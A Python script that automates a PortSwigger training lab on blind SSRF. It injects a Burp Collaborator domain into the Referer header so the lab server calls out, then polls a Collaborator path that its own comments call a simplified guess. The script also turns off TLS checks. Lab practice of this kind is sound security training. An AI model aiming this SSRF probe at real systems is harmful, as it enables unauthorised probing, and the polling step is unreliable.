#!/usr/bin/env python3
"""
Blind SSRF with Out-of-Band Detection Lab Automation
PortSwigger Web Security Academy

This script automates the process of:
1. Fetching a product page
2. Injecting Collaborator payload into Referer header
3. Polling Collaborator for interactions
"""

import requests
import re
import time
import urllib3
from typing import Optional, Tuple
import sys

# Disable SSL warnings for lab environment
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BlindSSRFExploit:
    def __init__(self, lab_url: str, collaborator_url: str = None):
        """
        Initialize the exploit with lab URL and optional Collaborator URL
        
        Args:
            lab_url: The URL of the lab (e.g., https://0a890024037533de828addcb00d600fe.web-security-academy.net)
            collaborator_url: Your Burp Collaborator URL (e.g., wrrdxjrn9r4rbyjb8wnm2z3d54bvznnc.oastify.com)
        """
        self.lab_url = lab_url.rstrip('/')
        self.collaborator_url = collaborator_url
        self.session = requests.Session()
        self.session.verify = False  # Don't verify SSL for lab
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
            'Priority': 'u=0, i'
        })
    
    def get_session_cookie(self) -> Optional[str]:
        """
        Get a valid session cookie by visiting the main page
        """
        try:
            response = self.session.get(self.lab_url)
            if response.status_code == 200:
                print("[+] Successfully got session cookie")
                return self.session.cookies.get_dict().get('session')
        except Exception as e:
            print(f"[-] Error getting session: {e}")
        return None
    
    def fetch_product_page(self, product_id: int = 1) -> Tuple[bool, str]:
        """
        Fetch a product page to get a valid session and cookies
        
        Args:
            product_id: The product ID to fetch (default: 1)
        """
        url = f"{self.lab_url}/product?productId={product_id}"
        
        try:
            # First request without Referer to get session
            response = self.session.get(url)
            
            if response.status_code == 200:
                print(f"[+] Successfully fetched product page (ID: {product_id})")
                return True, "Success"
            else:
                print(f"[-] Failed to fetch product page. Status: {response.status_code}")
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            print(f"[-] Error fetching product page: {e}")
            return False, str(e)
    
    def send_ssrf_payload(self, product_id: int = 1) -> bool:
        """
        Send the SSRF payload by modifying the Referer header
        
        Args:
            product_id: The product ID to target
        """
        if not self.collaborator_url:
            print("[-] Collaborator URL not set!")
            return False
        
        url = f"{self.lab_url}/product?productId={product_id}"
        
        # Create headers with modified Referer
        headers = self.session.headers.copy()
        headers['Referer'] = f"https://{self.collaborator_url}/"
        
        try:
            print(f"[*] Sending request with Referer: {headers['Referer']}")
            response = self.session.get(url, headers=headers)
            
            if response.status_code == 200:
                print(f"[+] Payload sent successfully!")
                return True
            else:
                print(f"[-] Failed to send payload. Status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Error sending payload: {e}")
            return False
    
    def poll_collaborator(self) -> None:
        """
        Poll the Collaborator server for interactions
        Note: This is a simplified version - real polling would use Burp's Collaborator client API
        """
        print("\n[*] Waiting for Collaborator interactions...")
        print("[*] Press Ctrl+C to stop polling")
        
        poll_count = 0
        max_polls = 12  # Poll for about 60 seconds (12 * 5 seconds)
        
        while poll_count < max_polls:
            poll_count += 1
            print(f"[*] Poll {poll_count}/{max_polls} - Checking Collaborator...")
            
            # Construct the Collaborator polling URL
            # This is a simplified approach - the real Collaborator has a specific API
            poll_url = f"https://{self.collaborator_url}/burpresults"
            
            try:
                response = self.session.get(poll_url, timeout=5)
                
                # Check for interactions in response
                if response.status_code == 200:
                    if "dns" in response.text.lower() or "http" in response.text.lower():
                        print("[!] Found interactions! Check your Collaborator client for details.")
                        return
                    
            except Exception:
                # Polling may fail - that's okay, we'll rely on manual Burp Collaborator check
                pass
            
            print("[*] No interactions yet. Waiting 5 seconds...")
            time.sleep(5)
        
        print("\n[!] Polling complete. Check Burp Collaborator manually for interactions.")
    
    def automate_exploit(self, product_id: int = 1, collaborator_url: str = None):
        """
        Automate the entire exploit process
        
        Args:
            product_id: Product ID to target
            collaborator_url: Your Burp Collaborator URL
        """
        print("=" * 60)
        print("Blind SSRF with Out-of-Band Detection Exploit")
        print("PortSwigger Web Security Academy Lab")
        print("=" * 60)
        
        # Update collaborator URL if provided
        if collaborator_url:
            self.collaborator_url = collaborator_url
        
        if not self.collaborator_url:
            print("\n[!] Please provide a Burp Collaborator URL")
            print("    Example: abc123.oastify.com")
            collaborator_input = input("    Enter Collaborator URL: ").strip()
            if collaborator_input:
                self.collaborator_url = collaborator_input
            else:
                print("[-] No Collaborator URL provided. Exiting.")
                return
        
        print(f"\n[*] Target Lab: {self.lab_url}")
        print(f"[*] Collaborator: {self.collaborator_url}")
        
        # Step 1: Get session and fetch product page
        print("\n[+] Step 1: Fetching product page to establish session")
        success, _ = self.fetch_product_page(product_id)
        
        if not success:
            print("[-] Failed to fetch product page. Trying different product ID...")
            for pid in [2, 3, 4, 5]:
                print(f"[*] Trying product ID: {pid}")
                success, _ = self.fetch_product_page(pid)
                if success:
                    product_id = pid
                    break
            
            if not success:
                print("[-] Could not fetch any product page. Exiting.")
                return
        
        # Step 2: Send SSRF payload with modified Referer
        print(f"\n[+] Step 2: Sending SSRF payload to product ID: {product_id}")
        if not self.send_ssrf_payload(product_id):
            print("[-] Failed to send payload. Exiting.")
            return
        
        # Step 3: Poll Collaborator
        print("\n[+] Step 3: Polling Collaborator for interactions")
        print("[*] Note: For best results, check Burp Collaborator manually")
        self.poll_collaborator()
        
        print("\n" + "=" * 60)
        print("Exploit completed!")
        print("Check Burp Collaborator for DNS/HTTP interactions")
        print("If interactions appear, the lab is solved!")
        print("=" * 60)


def main():
    """Main function to run the exploit"""
    
    # Configuration
    # Replace with your actual lab URL from PortSwigger
    LAB_URL = "https://0a890024037533de828addcb00d600fe.web-security-academy.net"
    
    # Replace with your actual Collaborator URL from Burp Suite
    # You can get this from Burp -> Collaborator tab -> "Copy to clipboard"
    COLLABORATOR_URL = None  # Set this to your Collaborator URL or pass as argument
    
    # Parse command line arguments
    if len(sys.argv) > 1:
        LAB_URL = sys.argv[1]
    if len(sys.argv) > 2:
        COLLABORATOR_URL = sys.argv[2]
    
    # Create exploit instance
    exploit = BlindSSRFExploit(LAB_URL, COLLABORATOR_URL)
    
    # Run the exploit
    exploit.automate_exploit(product_id=1)


if __name__ == "__main__":
    main()
